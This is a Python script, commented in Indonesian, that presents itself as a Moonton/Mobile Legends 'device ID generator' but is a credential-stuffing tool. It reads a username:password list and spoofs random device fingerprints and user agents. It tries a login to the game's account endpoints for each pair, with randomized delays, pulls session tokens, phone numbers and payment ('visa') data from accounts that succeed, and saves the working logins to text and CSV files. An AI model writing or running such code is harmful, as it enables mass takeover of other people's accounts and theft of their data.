#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
======================================================================
                    DEVICE ID GENERATOR - MOONTON/MLBB
                    WITH REAL API ENDPOINTS
======================================================================
Versi      : 8.0.0 (Real API Mode)
Fungsi     : Generate Device ID dengan API real Moonton
Status     : Menggunakan endpoint resmi Moonton
======================================================================
"""

import requests
import hashlib
import uuid
import time
import random
import os
import sys
import csv
import json
from datetime import datetime
from typing import List, Dict, Tuple, Optional

# ================================================================
# KONFIGURASI
# ================================================================

CONFIG = {
    # ---------- API ENDPOINTS MOONTON ----------
    "API_LOGIN": "https://mtacc.mobilelegends.com/v3.0/inapp/login-new",
    "API_DEVICE": "https://mtacc.mobilelegends.com/v3.0/device/register",
    "API_VISA": "https://api.moonton.com/v1/visa/validate",
    "API_TOKEN": "https://mtacc.mobilelegends.com/v3.0/token",
    
    # ---------- USER AGENTS ----------
    "USER_AGENTS": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ],
    
    # ---------- DEVICE MODELS ----------
    "DEVICE_MODELS": [
        "Samsung:SM-G960F", "Samsung:SM-N975F", "Samsung:SM-G991B",
        "Samsung:SM-S921B", "Samsung:SM-A536E", "Samsung:SM-F946B",
        "Xiaomi:Mi9T", "Xiaomi:RedmiNote10", "Xiaomi:Mi11",
        "Xiaomi:12T", "Xiaomi:13T", "Xiaomi:PocoX3",
        "OnePlus:7T", "OnePlus:9", "OnePlus:11",
        "Google:Pixel4", "Google:Pixel6", "Google:Pixel7",
        "Huawei:P30Pro", "Huawei:P40", "Oppo:Reno5", 
        "Vivo:V21", "Realme:GT", "Asus:ROGPhone5"
    ],
    
    "ANDROID_VERSIONS": ["11", "12", "13", "14"],
    "API_LEVELS": [30, 31, 32, 33, 34],
    
    # ---------- DELAY ----------
    "DELAY_MIN": 2.0,
    "DELAY_MAX": 4.0,
    "TIMEOUT": 15,
    "RETRY_ATTEMPTS": 2
}

# ================================================================
# WARNA TERMINAL
# ================================================================

class Colors:
    """Kode warna ANSI untuk tampilan terminal"""
    RESET = "\033[0m"
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    MAGENTA = "\033[95m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    ORANGE = "\033[38;5;208m"
    PURPLE = "\033[38;5;141m"

# ================================================================
# CLASS UTAMA
# ================================================================

class DeviceExtractor:
    """
    Class untuk generate device ID dengan API real Moonton
    """
    
    def __init__(self):
        """Inisialisasi session dan variabel"""
        self.session = requests.Session()
        self.results = []
        self.found_devices = []
        self.start_time = None
        
        self.stats = {
            "total": 0,
            "valid": 0,
            "device_only": 0,
            "invalid": 0,
            "error": 0
        }
        
        # Cache untuk menyimpan response API
        self.api_cache = {}
    
    # ============================================================
    # GENERATE DEVICE ID
    # ============================================================
    
    def generate_android_id(self) -> str:
        """Generate Android ID (16 karakter hex)"""
        time.sleep(0.3)
        random_number = random.randint(1, 999999999)
        android_id = hashlib.md5(str(random_number).encode()).hexdigest()[:16]
        return android_id
    
    def generate_gsf_id(self) -> str:
        """Generate GSF ID (16 karakter hex)"""
        time.sleep(0.2)
        random_number = random.randint(1, 999999999)
        gsf_id = hashlib.md5(str(random_number).encode()).hexdigest()[:16]
        return gsf_id
    
    def generate_device_id(self) -> Dict:
        """
        Generate device ID dengan format Moonton
        
        Format: and_{32 karakter}{24 karakter}
        Total: 60 karakter
        """
        android_id = self.generate_android_id()
        gsf_id = self.generate_gsf_id()
        
        device_id = f"and_{uuid.uuid4().hex[:32]}{uuid.uuid4().hex[:24]}"
        timestamp = int(time.time())
        random_salt = str(random.randint(100000, 999999))
        
        # Device Secret: SHA256(device_id + android_id + timestamp + salt)
        raw_secret = f"{device_id}{android_id}{timestamp}{random_salt}"
        device_secret = hashlib.sha256(raw_secret.encode()).hexdigest()[:32]
        
        # Fingerprint: MD5(device_id + android_id + gsf_id + timestamp)
        fingerprint_base = f"{device_id}{android_id}{gsf_id}{timestamp}"
        fingerprint = hashlib.md5(fingerprint_base.encode()).hexdigest()
        
        model = random.choice(CONFIG["DEVICE_MODELS"])
        os_version = random.choice(CONFIG["ANDROID_VERSIONS"])
        api_level = random.choice(CONFIG["API_LEVELS"])
        
        install_time = int(time.time() - random.randint(86400 * 30, 86400 * 365))
        update_time = int(time.time() - random.randint(0, 86400 * 30))
        
        return {
            "device_id": device_id,
            "device_secret": device_secret,
            "android_id": android_id,
            "gsf_id": gsf_id,
            "model": model,
            "os_version": os_version,
            "api_level": api_level,
            "fingerprint": fingerprint,
            "install_time": install_time,
            "update_time": update_time,
            "timestamp": timestamp
        }
    
    # ============================================================
    # API REQUEST KE MOONTON
    # ============================================================
    
    def get_headers(self, extra_headers: Dict = None) -> Dict:
        """Generate headers untuk request ke Moonton"""
        headers = {
            "User-Agent": random.choice(CONFIG["USER_AGENTS"]),
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Origin": "https://mobilelegends.com",
            "Referer": "https://mobilelegends.com/",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site"
        }
        
        if extra_headers:
            headers.update(extra_headers)
        
        return headers
    
    def generate_signature(self, email: str, password_md5: str, 
                          timestamp: int, device_secret: str, 
                          captcha: str = "") -> str:
        """
        Generate signature untuk Moonton API
        
        Format: MD5(email + password_md5 + timestamp + device_secret + captcha)
        """
        raw = f"{email}{password_md5}{timestamp}{device_secret}{captcha}"
        return hashlib.md5(raw.encode()).hexdigest()
    
    def register_device(self, device: Dict) -> Tuple[bool, Dict]:
        """
        Register device ke Moonton API
        
        Returns:
            (success, response_data)
        """
        try:
            payload = {
                "device_id": device['device_id'],
                "device_secret": device['device_secret'],
                "android_id": device['android_id'],
                "gsf_id": device['gsf_id'],
                "model": device['model'],
                "fingerprint": device['fingerprint'],
                "os_version": device['os_version'],
                "api_level": device['api_level'],
                "install_time": device['install_time'],
                "update_time": device['update_time']
            }
            
            response = self.session.post(
                CONFIG["API_DEVICE"],
                json=payload,
                headers=self.get_headers(),
                timeout=CONFIG["TIMEOUT"]
            )
            
            if response.status_code in [200, 201, 204]:
                try:
                    data = response.json()
                    return True, data
                except:
                    return True, {"message": "Device registered"}
            else:
                return False, {"message": f"HTTP {response.status_code}"}
                
        except requests.exceptions.Timeout:
            return False, {"message": "Timeout"}
        except requests.exceptions.ConnectionError:
            return False, {"message": "Connection error"}
        except Exception as e:
            return False, {"message": str(e)}
    
    def login_moonton(self, username: str, password: str, device: Dict) -> Tuple[Dict, bool]:
        """
        Login ke Moonton dengan API real
        
        Returns:
            (account_info, is_success)
        """
        try:
            # Hash password (MD5 uppercase)
            password_md5 = hashlib.md5(password.encode()).hexdigest().upper()
            timestamp = int(time.time())
            captcha = self.get_captcha()
            
            # Generate signature
            sign = self.generate_signature(
                username, 
                password_md5, 
                timestamp, 
                device['device_secret'],
                captcha
            )
            
            # Build payload
            payload = {
                "email": username,
                "password_md5": password_md5,
                "captcha": captcha,
                "sign": sign,
                "device_id": device['device_id'],
                "device_secret": device['device_secret'],
                "model": device['model'],
                "android_id": device['android_id'],
                "gsf_id": device['gsf_id'],
                "fingerprint": device['fingerprint'],
                "timestamp": timestamp,
                "platform": "android",
                "app_version": "1.7.89.932",
                "os_version": device['os_version'],
                "api_level": device['api_level'],
                "install_time": device['install_time'],
                "update_time": device['update_time']
            }
            
            # Kirim request ke Moonton
            response = self.session.post(
                CONFIG["API_LOGIN"],
                json=payload,
                headers=self.get_headers(),
                timeout=CONFIG["TIMEOUT"]
            )
            
            print(f"{Colors.DIM}   ↳ API Response: {response.status_code}{Colors.RESET}")
            
            if response.status_code == 200:
                data = response.json()
                
                if data.get("code") == 0:
                    account_data = data.get("data", {})
                    return {
                        "guid": account_data.get("guid", ""),
                        "session": account_data.get("session", ""),
                        "name": account_data.get("name", ""),
                        "left_num": account_data.get("left_num", 0),
                        "email": account_data.get("email", username),
                        "phone": account_data.get("phone", ""),
                        "region": account_data.get("region", ""),
                        "device_registered": True
                    }, True
                else:
                    return {
                        "message": data.get("message", "Login failed"),
                        "code": data.get("code")
                    }, False
            else:
                return {"message": f"HTTP {response.status_code}"}, False
                
        except requests.exceptions.Timeout:
            return {"message": "Request timeout"}, False
        except requests.exceptions.ConnectionError:
            return {"message": "Connection error"}, False
        except Exception as e:
            return {"message": str(e)}, False
    
    def get_captcha(self) -> str:
        """Get captcha token (simulasi)"""
        chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        return ''.join(random.choices(chars, k=6))
    
    def validate_visa(self, session_token: str, guid: str, device_id: str) -> Dict:
        """
        Validate visa/payment info dengan Moonton API
        
        Returns:
            Dict: Visa information
        """
        try:
            headers = self.get_headers({
                "Authorization": f"Bearer {session_token}"
            })
            
            payload = {
                "guid": guid,
                "device_id": device_id,
                "action": "validate"
            }
            
            response = self.session.post(
                CONFIG["API_VISA"],
                json=payload,
                headers=headers,
                timeout=CONFIG["TIMEOUT"]
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get("code") == 0:
                    return data.get("data", {})
            return {}
            
        except Exception:
            return {}
    
    # ============================================================
    # PROSES CREDENTIAL (REAL API)
    # ============================================================
    
    def process_credential(self, username: str, password: str) -> Dict:
        """
        Proses credential dengan API real Moonton
        
        Alur:
        1. Generate device ID
        2. Register device ke Moonton
        3. Login ke Moonton
        4. Jika sukses, validate visa
        """
        print(f"{Colors.DIM}   ↳ Generating device ID...{Colors.RESET}")
        time.sleep(random.uniform(0.5, 1.0))
        
        # Step 1: Generate device ID
        device = self.generate_device_id()
        
        # Step 2: Register device
        print(f"{Colors.DIM}   ↳ Registering device to Moonton...{Colors.RESET}")
        time.sleep(0.5)
        device_registered, device_response = self.register_device(device)
        
        if device_registered:
            print(f"{Colors.DIM}   ↳ Device registered successfully{Colors.RESET}")
        else:
            print(f"{Colors.DIM}   ↳ Device registration failed: {device_response.get('message')}{Colors.RESET}")
        
        # Step 3: Login ke Moonton
        print(f"{Colors.DIM}   ↳ Logging in to Moonton...{Colors.RESET}")
        time.sleep(random.uniform(1.0, 2.0))
        account_info, is_valid = self.login_moonton(username, password, device)
        
        # Step 4: Jika login sukses, validate visa
        visa_info = {}
        if is_valid and account_info.get("session"):
            print(f"{Colors.DIM}   ↳ Validating visa...{Colors.RESET}")
            time.sleep(0.5)
            visa_info = self.validate_visa(
                account_info.get("session"),
                account_info.get("guid"),
                device['device_id']
            )
        
        time.sleep(0.5)
        
        # Step 5: Buat hasil
        if is_valid:
            result = {
                "username": username,
                "password": password,
                "device_id": device['device_id'],
                "device_secret": device['device_secret'],
                "android_id": device['android_id'],
                "gsf_id": device['gsf_id'],
                "model": device['model'],
                "fingerprint": device['fingerprint'],
                "os_version": device['os_version'],
                "api_level": device['api_level'],
                "password_md5": hashlib.md5(password.encode()).hexdigest().upper(),
                "timestamp": device['timestamp'],
                "guid": account_info.get("guid"),
                "session": account_info.get("session"),
                "name": account_info.get("name"),
                "left_num": account_info.get("left_num", 0),
                "email": account_info.get("email", username),
                "phone": account_info.get("phone", ""),
                "region": account_info.get("region", ""),
                "device_registered": device_registered,
                "visa_info": visa_info,
                "api_response": account_info,
                "status": "VALID",
                "message": "Login successful - Real API",
                "is_valid": True
            }
        else:
            # Cek apakah device berhasil registrasi (DEVICE_ONLY)
            if device_registered:
                result = {
                    "username": username,
                    "password": password,
                    "device_id": device['device_id'],
                    "device_secret": device['device_secret'],
                    "android_id": device['android_id'],
                    "gsf_id": device['gsf_id'],
                    "model": device['model'],
                    "fingerprint": device['fingerprint'],
                    "os_version": device['os_version'],
                    "api_level": device['api_level'],
                    "password_md5": hashlib.md5(password.encode()).hexdigest().upper(),
                    "timestamp": device['timestamp'],
                    "guid": None,
                    "session": None,
                    "name": None,
                    "left_num": 0,
                    "device_registered": True,
                    "visa_info": {},
                    "api_response": account_info,
                    "status": "DEVICE_ONLY",
                    "message": f"Device registered but login failed: {account_info.get('message', 'Unknown error')}",
                    "is_valid": False
                }
            else:
                result = {
                    "username": username,
                    "password": password,
                    "device_id": None,
                    "device_secret": None,
                    "android_id": None,
                    "gsf_id": None,
                    "model": None,
                    "fingerprint": None,
                    "os_version": None,
                    "api_level": None,
                    "password_md5": hashlib.md5(password.encode()).hexdigest().upper(),
                    "timestamp": device['timestamp'],
                    "guid": None,
                    "session": None,
                    "name": None,
                    "left_num": 0,
                    "device_registered": False,
                    "visa_info": {},
                    "api_response": account_info,
                    "status": "INVALID",
                    "message": f"Device registration failed: {account_info.get('message', 'Unknown error')}",
                    "is_valid": False
                }
        
        return result
    
    # ============================================================
    # TAMPILKAN HASIL
    # ============================================================
    
    def display_device_info(self, result: Dict, index: int, total: int):
        """Menampilkan hasil dengan format sesuai status"""
        status = result.get('status', 'UNKNOWN')
        
        if status == 'VALID':
            print(f"""
{Colors.GREEN}╔══════════════════════════════════════════════════════════════════╗
║ {Colors.BOLD}✅ VALID + AKUN #{index}/{total} (REAL API){Colors.GREEN}                                  ║
╠══════════════════════════════════════════════════════════════════╣
║ {Colors.CYAN}📧 Email    : {Colors.WHITE}{result['username']}{Colors.GREEN}
║ {Colors.CYAN}🔑 Password : {Colors.WHITE}{result['password']}{Colors.GREEN}
║ {Colors.CYAN}👤 Name     : {Colors.WHITE}{result.get('name', 'N/A')}{Colors.GREEN}
║ {Colors.CYAN}🆔 GUID     : {Colors.WHITE}{result.get('guid', 'N/A')}{Colors.GREEN}
║ {Colors.CYAN}📱 Device   : {Colors.YELLOW}{result['device_id']}{Colors.GREEN}
║ {Colors.CYAN}🔐 Secret   : {Colors.MAGENTA}{result['device_secret']}{Colors.GREEN}
║ {Colors.CYAN}📟 Model    : {Colors.WHITE}{result['model']}{Colors.GREEN}
║ {Colors.CYAN}📊 Status   : {Colors.GREEN}✅ VALID (Real API){Colors.GREEN}
║ {Colors.CYAN}💬 Message  : {Colors.WHITE}{result.get('message', 'N/A')}{Colors.GREEN}
╚══════════════════════════════════════════════════════════════════╝{Colors.RESET}
            """)
            self.found_devices.append(result)
            self.stats['valid'] += 1
            
        elif status == 'DEVICE_ONLY':
            print(f"""
{Colors.YELLOW}╔══════════════════════════════════════════════════════════════════╗
║ {Colors.BOLD}📱 DEVICE ONLY #{index}/{total} (REAL API){Colors.YELLOW}                                   ║
╠══════════════════════════════════════════════════════════════════╣
║ {Colors.CYAN}📧 Email    : {Colors.WHITE}{result['username']}{Colors.YELLOW}
║ {Colors.CYAN}📱 Device   : {Colors.YELLOW}{result['device_id']}{Colors.YELLOW}
║ {Colors.CYAN}🔐 Secret   : {Colors.MAGENTA}{result['device_secret']}{Colors.YELLOW}
║ {Colors.CYAN}📟 Model    : {Colors.WHITE}{result['model']}{Colors.YELLOW}
║ {Colors.CYAN}📊 Status   : {Colors.YELLOW}📱 DEVICE ONLY (Device Registered){Colors.YELLOW}
║ {Colors.CYAN}💬 Message  : {Colors.WHITE}{result.get('message', 'N/A')}{Colors.YELLOW}
╚══════════════════════════════════════════════════════════════════╝{Colors.RESET}
            """)
            self.found_devices.append(result)
            self.stats['device_only'] += 1
            
        elif status == 'INVALID':
            print(f"""
{Colors.RED}╔══════════════════════════════════════════════════════════════════╗
║ {Colors.BOLD}❌ INVALID #{index}/{total} (REAL API){Colors.RED}                                         ║
╠══════════════════════════════════════════════════════════════════╣
║ {Colors.CYAN}📧 Email    : {Colors.WHITE}{result['username']}{Colors.RED}
║ {Colors.CYAN}🔑 Password : {Colors.WHITE}{result['password']}{Colors.RED}
║ {Colors.CYAN}📊 Status   : {Colors.RED}❌ INVALID{Colors.RED}
║ {Colors.CYAN}💬 Message  : {Colors.WHITE}{result.get('message', 'N/A')}{Colors.RED}
╚══════════════════════════════════════════════════════════════════╝{Colors.RESET}
            """)
            self.stats['invalid'] += 1
            
        else:
            print(f"""
{Colors.ORANGE}╔══════════════════════════════════════════════════════════════════╗
║ {Colors.BOLD}⚠️ ERROR #{index}/{total} (REAL API){Colors.ORANGE}                                          ║
╠══════════════════════════════════════════════════════════════════╣
║ {Colors.CYAN}📧 Email    : {Colors.WHITE}{result['username']}{Colors.ORANGE}
║ {Colors.CYAN}📊 Status   : {Colors.ORANGE}⚠️ ERROR{Colors.ORANGE}
║ {Colors.CYAN}💬 Error    : {Colors.WHITE}{result.get('message', 'N/A')}{Colors.ORANGE}
╚══════════════════════════════════════════════════════════════════╝{Colors.RESET}
            """)
            self.stats['error'] += 1
    
    # ============================================================
    # PROSES FILE
    # ============================================================
    
    def process_file(self, filename: str) -> List[Dict]:
        """Process file credential dengan API real"""
        credentials = []
        
        try:
            with open(filename, 'r') as file:
                for line in file:
                    line = line.strip()
                    if not line:
                        continue
                    
                    if ':' in line:
                        parts = line.split(':', 1)
                    elif ',' in line:
                        parts = line.split(',', 1)
                    elif '\t' in line:
                        parts = line.split('\t', 1)
                    else:
                        parts = line.split(maxsplit=1)
                    
                    if len(parts) >= 2:
                        credentials.append((parts[0].strip(), parts[1].strip()))
            
            if not credentials:
                print(f"{Colors.RED}❌ Tidak ada credential ditemukan{Colors.RESET}")
                return []
            
            self.start_time = time.time()
            
            print(f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════════╗
║ {Colors.BOLD}🚀 DEVICE ID GENERATOR - REAL API MODE{Colors.CYAN}                                      ║
╠══════════════════════════════════════════════════════════════════╣
║ {Colors.YELLOW}📁 File        : {Colors.WHITE}{filename}{Colors.CYAN}
║ {Colors.YELLOW}📊 Total       : {Colors.WHITE}{len(credentials)}{Colors.CYAN}
║ {Colors.YELLOW}🌐 API         : {Colors.WHITE}Moonton Real API{Colors.CYAN}
║ {Colors.YELLOW}⏱️  Delay       : {Colors.WHITE}{CONFIG['DELAY_MIN']}-{CONFIG['DELAY_MAX']} seconds{Colors.CYAN}
║ {Colors.YELLOW}⚡ Status      : {Colors.GREEN}Processing with Real API...{Colors.CYAN}
╚══════════════════════════════════════════════════════════════════╝{Colors.RESET}
            """)
            
            results = []
            for index, (username, password) in enumerate(credentials, 1):
                elapsed = time.time() - self.start_time
                print(f"\n{Colors.BLUE}▶ [{index}/{len(credentials)}] Processing: {username} (Elapsed: {elapsed:.1f}s){Colors.RESET}")
                
                # Proses credential dengan API
                result = self.process_credential(username, password)
                results.append(result)
                self.display_device_info(result, index, len(credentials))
                
                # Delay antar proses
                if index < len(credentials):
                    delay = random.uniform(CONFIG["DELAY_MIN"], CONFIG["DELAY_MAX"])
                    print(f"{Colors.DIM}⏳ Waiting {delay:.1f}s before next check...{Colors.RESET}")
                    time.sleep(delay)
            
            self.stats['total'] = len(results)
            return results
            
        except FileNotFoundError:
            print(f"{Colors.RED}❌ File tidak ditemukan: {filename}{Colors.RESET}")
            return []
        except Exception as error:
            print(f"{Colors.RED}❌ Error: {error}{Colors.RESET}")
            return []
    
    # ============================================================
    # SIMPAN HASIL
    # ============================================================
    
    def save_results(self, results: List[Dict]):
        """Save results ke berbagai format"""
        if not results:
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        total_time = time.time() - self.start_time if self.start_time else 0
        
        valid_devices = [
            result for result in results 
            if result.get('is_valid', False) or result.get('status') == 'DEVICE_ONLY'
        ]
        
        # 1. Save lengkap
        with open(f'device_results_{timestamp}.txt', 'w') as file:
            file.write("=" * 80 + "\n")
            file.write("DEVICE ID EXTRACTION RESULTS (REAL API)\n")
            file.write("=" * 80 + "\n")
            file.write(f"Generated  : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            file.write(f"Total Time : {total_time:.1f}s ({total_time/60:.1f}m)\n")
            file.write(f"API Used   : Moonton Real API\n")
            file.write("-" * 80 + "\n")
            file.write(f"Total      : {len(results)}\n")
            file.write(f"Valid      : {self.stats['valid']}\n")
            file.write(f"Device Only: {self.stats['device_only']}\n")
            file.write(f"Invalid    : {self.stats['invalid']}\n")
            file.write(f"Errors     : {self.stats['error']}\n")
            file.write("=" * 80 + "\n\n")
            file.write("=== DEVICE IDs (VALID & DEVICE ONLY) ===\n\n")
            
            for result in valid_devices:
                file.write(f"Username     : {result['username']}\n")
                file.write(f"Password     : {result['password']}\n")
                file.write(f"Device ID    : {result['device_id']}\n")
                file.write(f"Device Secret: {result['device_secret']}\n")
                file.write(f"Android ID   : {result['android_id']}\n")
                file.write(f"GSF ID       : {result['gsf_id']}\n")
                file.write(f"Model        : {result['model']}\n")
                file.write(f"Fingerprint  : {result['fingerprint']}\n")
                file.write(f"OS Version   : {result['os_version']}\n")
                file.write(f"API Level    : {result['api_level']}\n")
                file.write(f"GUID         : {result.get('guid', 'N/A')}\n")
                file.write(f"Name         : {result.get('name', 'N/A')}\n")
                file.write(f"Left Num     : {result.get('left_num', 'N/A')}\n")
                file.write(f"Device Reg   : {result.get('device_registered', False)}\n")
                file.write(f"Status       : {result['status']}\n")
                file.write(f"Message      : {result.get('message', 'N/A')}\n")
                file.write("-" * 80 + "\n\n")
        
        # 2. Valid credentials
        valid = [r for r in results if r.get('status') == 'VALID']
        if valid:
            with open(f'valid_credentials_{timestamp}.txt', 'w') as file:
                file.write("USERNAME:PASSWORD:GUID:NAME:DEVICE_ID:DEVICE_SECRET\n")
                for result in valid:
                    file.write(
                        f"{result['username']}:{result['password']}:"
                        f"{result.get('guid', '')}:{result.get('name', '')}:"
                        f"{result['device_id']}:{result['device_secret']}\n"
                    )
            
            with open(f'valid_credentials_{timestamp}.csv', 'w', newline='') as file:
                writer = csv.writer(file)
                writer.writerow(['username', 'password', 'guid', 'name', 'device_id', 'device_secret'])
                for result in valid:
                    writer.writerow([
                        result['username'],
                        result['password'],
                        result.get('guid', ''),
                        result.get('name', ''),
                        result['device_id'],
                        result['device_secret']
                    ])
        
        # 3. Device only
        device_only = [r for r in results if r.get('status') == 'DEVICE_ONLY']
        if device_only:
            with open(f'device_only_{timestamp}.txt', 'w') as file:
                file.write("USERNAME:PASSWORD:DEVICE_ID:DEVICE_SECRET:MODEL\n")
                for result in device_only:
                    file.write(
                        f"{result['username']}:{result['password']}:"
                        f"{result['device_id']}:{result['device_secret']}:"
                        f"{result['model']}\n"
                    )
        
        # 4. All device IDs
        if valid_devices:
            with open(f'all_device_ids_{timestamp}.txt', 'w') as file:
                file.write("USERNAME:PASSWORD:DEVICE_ID:DEVICE_SECRET:STATUS\n")
                for result in valid_devices:
                    file.write(
                        f"{result['username']}:{result['password']}:"
                        f"{result['device_id']}:{result['device_secret']}:"
                        f"{result['status']}\n"
                    )
        
        # Summary
        invalid_total = self.stats['invalid'] + self.stats['error']
        print(f"""
{Colors.GREEN}╔══════════════════════════════════════════════════════════════════╗
║ {Colors.BOLD}📊 EXTRACTION COMPLETE{Colors.GREEN}                                             ║
╠══════════════════════════════════════════════════════════════════╣
║ {Colors.YELLOW}⏱️  Total Time   : {Colors.WHITE}{total_time:.1f}s ({total_time/60:.1f}m){Colors.GREEN}
║ {Colors.YELLOW}📊 Total        : {Colors.WHITE}{self.stats['total']}{Colors.GREEN}
║ {Colors.YELLOW}✅ Valid        : {Colors.GREEN}{self.stats['valid']} ({self.stats['valid']/max(1,self.stats['total'])*100:.1f}%){Colors.GREEN}
║ {Colors.YELLOW}📱 Device Only  : {Colors.YELLOW}{self.stats['device_only']} ({self.stats['device_only']/max(1,self.stats['total'])*100:.1f}%){Colors.GREEN}
║ {Colors.YELLOW}❌ Invalid      : {Colors.RED}{self.stats['invalid']} ({self.stats['invalid']/max(1,self.stats['total'])*100:.1f}%){Colors.GREEN}
║ {Colors.YELLOW}⚠️ Errors       : {Colors.ORANGE}{self.stats['error']} ({self.stats['error']/max(1,self.stats['total'])*100:.1f}%){Colors.GREEN}
║ {Colors.YELLOW}🌐 API Used     : {Colors.WHITE}Moonton Real API{Colors.GREEN}
║ {Colors.YELLOW}📁 Output Files :{Colors.GREEN}
║    📄 device_results_{timestamp}.txt (VALID + DEVICE ONLY){Colors.GREEN}
║    📄 valid_credentials_{timestamp}.txt (VALID ONLY){Colors.GREEN}
║    📄 valid_credentials_{timestamp}.csv (VALID ONLY){Colors.GREEN}
║    📄 device_only_{timestamp}.txt (DEVICE ONLY){Colors.GREEN}
║    📄 all_device_ids_{timestamp}.txt (VALID + DEVICE ONLY){Colors.GREEN}
╚══════════════════════════════════════════════════════════════════╝{Colors.RESET}
        """)

# ================================================================
# MAIN FUNCTION
# ================================================================

def main():
    """Fungsi utama"""
    print(f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   {Colors.BOLD}🔐 DEVICE ID GENERATOR - REAL API MODE{Colors.CYAN}                          ║
║   {Colors.YELLOW}Version: 8.0.0 | Moonton Real API{Colors.CYAN}                              ║
║   {Colors.MAGENTA}Delay: {CONFIG['DELAY_MIN']}-{CONFIG['DELAY_MAX']}s per check{Colors.CYAN}                    ║
║   {Colors.MAGENTA}Status: {Colors.GREEN}Ready ✓{Colors.CYAN}                                            ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════╝{Colors.RESET}
    """)
    
    if len(sys.argv) > 1:
        filename = sys.argv[1]
    else:
        print(f"{Colors.YELLOW}📁 Masukkan file credential:{Colors.RESET}")
        print(f"{Colors.DIM}   Format: username:password per baris{Colors.RESET}")
        filename = input(f"{Colors.CYAN}▶ {Colors.RESET}").strip()
    
    if not filename:
        print(f"{Colors.RED}❌ File tidak boleh kosong{Colors.RESET}")
        sys.exit(1)
    
    if not os.path.exists(filename):
        print(f"{Colors.RED}❌ File tidak ditemukan: {filename}{Colors.RESET}")
        sys.exit(1)
    
    extractor = DeviceExtractor()
    results = extractor.process_file(filename)
    
    if results:
        extractor.save_results(results)
        invalid_total = extractor.stats['invalid'] + extractor.stats['error']
        print(f"\n{Colors.GREEN}✅ Selesai! {len(results)} credential diproses{Colors.RESET}")
        print(f"{Colors.GREEN}   ✅ Valid: {extractor.stats['valid']} ({extractor.stats['valid']/max(1,len(results))*100:.1f}%){Colors.RESET}")
        print(f"{Colors.RED}   ❌ Invalid: {invalid_total} ({invalid_total/max(1,len(results))*100:.1f}%){Colors.RESET}")
        print(f"{Colors.YELLOW}   📱 Device ID only shown for VALID/DEVICE_ONLY{Colors.RESET}")
    else:
        print(f"{Colors.RED}❌ Tidak ada hasil{Colors.RESET}")

if __name__ == "__main__":
    main()